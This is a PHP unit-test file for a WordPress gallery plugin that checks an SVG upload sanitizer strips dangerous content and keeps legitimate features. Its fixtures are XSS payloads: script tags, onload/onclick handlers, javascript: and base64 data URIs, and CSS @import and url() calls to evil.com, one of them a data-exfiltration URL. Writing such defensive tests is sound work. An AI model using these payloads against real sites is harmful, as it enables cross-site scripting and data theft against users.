<?php
/**
 * P20-L — SVG upload sanitization tests.
 *
 * Verifies that WPSG_Overlay_Library::sanitize_svg_string() strips
 * dangerous content (scripts, event handlers, foreignObject, javascript:
 * URIs, CSS exfiltration) while preserving legitimate SVG features
 * (gradients, filters, clip-paths, embedded raster images).
 *
 * @package WP_Super_Gallery
 */

class WPSG_SVG_Sanitization_Test extends WP_UnitTestCase {

    /**
     * Helper: sanitize an SVG string and return the result.
     */
    private function sanitize( string $svg ): ?string {
        return WPSG_Overlay_Library::sanitize_svg_string( $svg );
    }

    // ── Attack vectors ─────────────────────────────────────────

    public function test_strips_script_tags(): void {
        $dirty = '<svg xmlns="http://www.w3.org/2000/svg"><script>alert("xss")</script><rect width="100" height="100"/></svg>';
        $clean = $this->sanitize( $dirty );

        $this->assertNotNull( $clean );
        $this->assertStringNotContainsString( '<script', $clean );
        $this->assertStringNotContainsString( 'alert', $clean );
        $this->assertStringContainsString( '<rect', $clean );
    }

    public function test_strips_onload_handler(): void {
        $dirty = '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"><rect width="100" height="100"/></svg>';
        $clean = $this->sanitize( $dirty );

        $this->assertNotNull( $clean );
        $this->assertStringNotContainsString( 'onload', $clean );
        $this->assertStringContainsString( '<rect', $clean );
    }

    public function test_strips_onclick_handler(): void {
        $dirty = '<svg xmlns="http://www.w3.org/2000/svg"><rect width="100" height="100" onclick="alert(1)"/></svg>';
        $clean = $this->sanitize( $dirty );

        $this->assertNotNull( $clean );
        $this->assertStringNotContainsString( 'onclick', $clean );
    }

    public function test_strips_foreign_object(): void {
        $dirty = '<svg xmlns="http://www.w3.org/2000/svg"><foreignObject width="200" height="200"><body xmlns="http://www.w3.org/1999/xhtml"><script>alert(1)</script></body></foreignObject></svg>';
        $clean = $this->sanitize( $dirty );

        $this->assertNotNull( $clean );
        $this->assertStringNotContainsString( 'foreignObject', $clean );
        $this->assertStringNotContainsString( '<script', $clean );
        $this->assertStringNotContainsString( '<body', $clean );
    }

    public function test_strips_javascript_uri_in_href(): void {
        $dirty = '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><a xlink:href="javascript:alert(1)"><text x="10" y="20">Click me</text></a></svg>';
        $clean = $this->sanitize( $dirty );

        $this->assertNotNull( $clean );
        $this->assertStringNotContainsString( 'javascript:', $clean );
    }

    public function test_strips_data_text_html_uri(): void {
        $dirty = '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><image xlink:href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==" width="100" height="100"/></svg>';
        $clean = $this->sanitize( $dirty );

        $this->assertNotNull( $clean );
        $this->assertStringNotContainsString( 'data:text/html', $clean );
    }

    public function test_strips_data_svg_xml_uri(): void {
        $dirty = '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><image xlink:href="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9ImFsZXJ0KDEpIj48L3N2Zz4=" width="100" height="100"/></svg>';
        $clean = $this->sanitize( $dirty );

        $this->assertNotNull( $clean );
        $this->assertStringNotContainsString( 'data:image/svg+xml', $clean );
    }

    public function test_strips_external_url_references(): void {
        $dirty = '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><image xlink:href="https://evil.com/tracker.svg" width="100" height="100"/></svg>';
        $clean = $this->sanitize( $dirty );

        $this->assertNotNull( $clean );
        $this->assertStringNotContainsString( 'evil.com', $clean );
    }

    public function test_strips_css_import_in_style(): void {
        $dirty = '<svg xmlns="http://www.w3.org/2000/svg"><style>@import url("https://evil.com/exfil.css");</style><rect width="100" height="100"/></svg>';
        $clean = $this->sanitize( $dirty );

        $this->assertNotNull( $clean );
        $this->assertStringNotContainsString( '@import', $clean );
        $this->assertStringNotContainsString( 'evil.com', $clean );
    }

    public function test_strips_css_expression(): void {
        $dirty = '<svg xmlns="http://www.w3.org/2000/svg"><style>rect { width: expression(alert(1)); }</style><rect width="100" height="100"/></svg>';
        $clean = $this->sanitize( $dirty );

        $this->assertNotNull( $clean );
        // expression should be commented out / neutralized
        $this->assertDoesNotMatchRegularExpression( '/expression\s*\(\s*alert/i', $clean );
    }

    public function test_strips_css_external_url(): void {
        $dirty = '<svg xmlns="http://www.w3.org/2000/svg"><style>rect { background: url("https://evil.com/exfil?data=secret"); }</style><rect width="100" height="100"/></svg>';
        $clean = $this->sanitize( $dirty );

        $this->assertNotNull( $clean );
        $this->assertStringNotContainsString( 'evil.com', $clean );
    }

    public function test_strips_moz_binding(): void {
        $dirty = '<svg xmlns="http://www.w3.org/2000/svg"><style>rect { -moz-binding: url("https://evil.com/xbl.xml#exploit"); }</style><rect width="100" height="100"/></svg>';
        $clean = $this->sanitize( $dirty );

        $this->assertNotNull( $clean );
        $this->assertStringNotContainsString( 'evil.com', $clean );
        $this->assertDoesNotMatchRegularExpression( '/-moz-binding\s*:\s*url/i', $clean );
    }

    public function test_rejects_entirely_malicious_svg(): void {
        $dirty = '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>';
        $clean = $this->sanitize( $dirty );

        // Should still return a valid (empty) SVG wrapper or null
        // since the only content was a script tag.
        // The enshrined sanitizer returns the SVG root even if children stripped,
        // so check that no dangerous content remains.
        if ( $clean !== null ) {
            $this->assertStringNotContainsString( '<script', $clean );
        }
    }

    // ── Clean SVG preservation ─────────────────────────────────

    public function test_preserves_gradients_and_filters(): void {
        $clean_svg = '<svg xmlns="http://www.w3.org/2000/svg"><defs><linearGradient id="grad1" x1="0%" y1="0%" x2="100%" y2="0%"><stop offset="0%" style="stop-color:rgb(255,255,0);stop-opacity:1"/><stop offset="100%" style="stop-color:rgb(255,0,0);stop-opacity:1"/></linearGradient><filter id="blur1"><feGaussianBlur stdDeviation="5"/></filter></defs><rect width="200" height="100" fill="url(#grad1)" filter="url(#blur1)"/></svg>';
        $result = $this->sanitize( $clean_svg );

        $this->assertNotNull( $result );
        $this->assertStringContainsString( 'linearGradient', $result );
        $this->assertStringContainsString( 'feGaussianBlur', $result );
        $this->assertStringContainsString( 'url(#grad1)', $result );
        $this->assertStringContainsString( 'url(#blur1)', $result );
    }

    public function test_preserves_clip_paths(): void {
        $clean_svg = '<svg xmlns="http://www.w3.org/2000/svg"><defs><clipPath id="clip1"><circle cx="50" cy="50" r="40"/></clipPath></defs><rect width="100" height="100" clip-path="url(#clip1)"/></svg>';
        $result = $this->sanitize( $clean_svg );

        $this->assertNotNull( $result );
        $this->assertStringContainsString( 'clipPath', $result );
        $this->assertStringContainsString( 'url(#clip1)', $result );
    }

    public function test_preserves_embedded_raster_data_uri(): void {
        // Minimal 1x1 red PNG as base64
        $png_b64 = 'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8/5+hHgAHggJ/PchI7wAAAABJRU5ErkJggg==';
        $clean_svg = '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><image xlink:href="data:image/png;base64,' . $png_b64 . '" width="100" height="100"/></svg>';
        $result = $this->sanitize( $clean_svg );

        $this->assertNotNull( $result );
        $this->assertStringContainsString( 'data:image/png;base64', $result );
    }

    public function test_preserves_internal_css_with_local_refs(): void {
        $clean_svg = '<svg xmlns="http://www.w3.org/2000/svg"><defs><linearGradient id="bg"><stop offset="0%" stop-color="#fff"/><stop offset="100%" stop-color="#000"/></linearGradient></defs><style>rect { fill: url(#bg); opacity: 0.8; }</style><rect width="100" height="100"/></svg>';
        $result = $this->sanitize( $clean_svg );

        $this->assertNotNull( $result );
        $this->assertStringContainsString( 'url(#bg)', $result );
        $this->assertStringContainsString( 'opacity', $result );
    }

    public function test_preserves_basic_shapes_and_attributes(): void {
        $clean_svg = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 200"><circle cx="100" cy="100" r="50" fill="#ff6600" stroke="#333" stroke-width="2"/><rect x="10" y="10" width="80" height="80" rx="5" fill="blue"/><path d="M10 80 C 40 10, 65 10, 95 80 S 150 150, 180 80" stroke="black" fill="transparent"/></svg>';
        $result = $this->sanitize( $clean_svg );

        $this->assertNotNull( $result );
        $this->assertStringContainsString( '<circle', $result );
        $this->assertStringContainsString( '<rect', $result );
        $this->assertStringContainsString( '<path', $result );
        $this->assertStringContainsString( 'viewBox', $result );
    }

    // ── CSS-specific validation ────────────────────────────────

    public function test_css_allows_embedded_font_data_uri(): void {
        $clean_svg = '<svg xmlns="http://www.w3.org/2000/svg"><style>@font-face { font-family: "Custom"; src: url(data:font/woff2;base64,d09GMk9UAQAAAA==); }</style><text font-family="Custom" x="10" y="30">Hello</text></svg>';
        $result = $this->sanitize( $clean_svg );

        $this->assertNotNull( $result );
        $this->assertStringContainsString( 'data:font/woff2;base64', $result );
    }

    public function test_css_blocks_external_font_url(): void {
        $dirty = '<svg xmlns="http://www.w3.org/2000/svg"><style>@font-face { font-family: "Evil"; src: url(https://evil.com/font.woff2); }</style><text x="10" y="30">Hello</text></svg>';
        $clean = $this->sanitize( $dirty );

        $this->assertNotNull( $clean );
        $this->assertStringNotContainsString( 'evil.com', $clean );
    }

    public function test_css_allows_raster_data_uri(): void {
        $clean_svg = '<svg xmlns="http://www.w3.org/2000/svg"><style>rect { background-image: url(data:image/png;base64,iVBOR); }</style><rect width="100" height="100"/></svg>';
        $result = $this->sanitize( $clean_svg );

        $this->assertNotNull( $result );
        $this->assertStringContainsString( 'data:image/png;base64', $result );
    }

    public function test_css_blocks_svg_data_uri(): void {
        $dirty = '<svg xmlns="http://www.w3.org/2000/svg"><style>rect { background: url(data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=); }</style><rect width="100" height="100"/></svg>';
        $clean = $this->sanitize( $dirty );

        $this->assertNotNull( $clean );
        $this->assertStringNotContainsString( 'data:image/svg+xml', $clean );
    }

    // ── File-level sanitization ────────────────────────────────

    public function test_sanitize_svg_file_writes_clean_output(): void {
        $tmp = wp_tempnam( 'wpsg-test-svg' );
        $dirty = '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script><rect width="100" height="100"/></svg>';
        file_put_contents( $tmp, $dirty );

        $result = WPSG_Overlay_Library::sanitize_svg_file( $tmp );

        $this->assertTrue( $result );
        $clean = file_get_contents( $tmp );
        $this->assertStringNotContainsString( '<script', $clean );
        $this->assertStringContainsString( '<rect', $clean );

        unlink( $tmp );
    }

    public function test_sanitize_svg_file_rejects_missing_file(): void {
        $result = WPSG_Overlay_Library::sanitize_svg_file( '/nonexistent/path.svg' );

        $this->assertInstanceOf( WP_Error::class, $result );
        $this->assertSame( 'wpsg_svg_missing', $result->get_error_code() );
    }
}
